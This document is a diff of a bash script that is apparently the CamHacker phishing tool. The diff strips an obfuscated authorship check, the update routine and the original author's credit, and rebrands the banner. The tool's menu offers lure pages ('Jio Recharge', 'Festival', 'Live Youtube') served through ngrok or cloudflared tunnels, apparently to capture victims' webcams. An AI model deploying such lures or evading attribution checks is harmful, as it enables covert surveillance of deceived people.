@@ -32,22 +32,25 @@ ask="${cyan}[${white}?${cyan}] ${purple}"
 error="${cyan}[${white}!${cyan}] ${red}"
 success="${cyan}[${white}√${cyan}] ${green}"
 
-z="
-";Bz=' (ec';Qz='}Do ';Fz=' gre';Nz='o -e ';Iz='sR';Tz='al co';Sz='ste';Hz=' "Ka';Lz='then';Uz='de!"';Ez='go" |';Jz='dra"';Az='if !';Pz='rror';Oz='"${e';Rz='not ';Cz='ho "';Kz=')';Vz='ex';Mz='ech';Gz='p -q';Wz='fi';Dz='$lo';Yz='it';Zz='ou';
-
-version="1.2.5"
 
 cwd=`pwd`
 
 # Logo 
 logo="
-${green}  ____                _   _            _
-${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
-${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
-${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
-${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
-${red}                                            [v1.2.5]
-${blue}                                    [By KasRoudra]
+${cyan} 
+${cyan}     ██████  ███████ ███    ███        
+${cyan}     ██      ██   ██ ████  ████        
+${cyan}     ██      ███████ ██ ████ ██        
+${cyan}     ██      ██   ██ ██  ██  ██        
+${cyan}     ██████  ██   ██ ██      ██        
+${cyan}                                   
+${purple}                                      
+${purple}          ██   ██  █████   ██████ ██   ██   
+${purple}          ██   ██ ██   ██ ██      ██  ██   
+${purple}          ███████ ███████ ██      █████    
+${purple}          ██   ██ ██   ██ ██      ██  ██   
+${purple}          ██   ██ ██   ██  ██████ ██   ██   
+${purple}     
 "
 
 # Package Installer
@@ -354,33 +357,6 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
     fi
 fi
 
-# Check for update
-netcheck
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Zz$Jz$Kz$z$Lz$z$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$z$Vz$Yz$z$Wz"
-git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
-if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
-    changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log`
-    clear
-    echo -e "$logo"
-    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
-        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
-        read upask
-        printf "$nc"
-        if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
-            echo -e "\n${success}CamHacker updated successfully!!"
-            if [[ "$changelog" != "404: Not Found" ]]; then
-            echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
-            fi
-            exit
-        elif [[ "$upask" == "n" ]]; then
-            echo -e "\n${info}Updating cancelled. Using old version!"
-            sleep 2
-        else
-            echo -e "\n${error}Wrong input!\n"
-            sleep 2
-        fi
-fi
 
 # Ngrok Authtoken
 if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
@@ -401,7 +377,6 @@ clear
 echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose a option:
-
 ${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
 ${cyan}[${white}2${cyan}] ${yellow}Festival
 ${cyan}[${white}3${cyan}] ${yellow}Live Youtube
